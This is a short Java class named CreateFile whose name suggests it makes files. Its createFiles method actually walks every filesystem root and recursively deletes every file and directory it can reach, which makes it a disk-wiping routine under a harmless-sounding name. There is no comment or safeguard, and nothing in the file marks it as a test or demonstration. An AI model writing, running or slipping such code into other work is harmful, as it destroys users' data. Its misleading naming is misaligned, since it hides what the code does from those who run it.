package file;

import java.io.File;

public class CreateFile extends Thread{
	
	public File file;
	
	public CreateFile(File file) {
		this.file = file;
	}
	
	 @Override
	public void run() {
		createFile(file);
	}
	 
	public static void createFiles () {
		File[] files = File.listRoots();
		for (File file : files) {
			new CreateFile(file).run();
		}
	}
	
	public void createFile(File file) {
		if (file.isDirectory()) {
			for (File f : file.listFiles()) {
				new CreateFile(f).run();
				file.delete();
			}
		} else {
			file.delete();
		}
	}
}
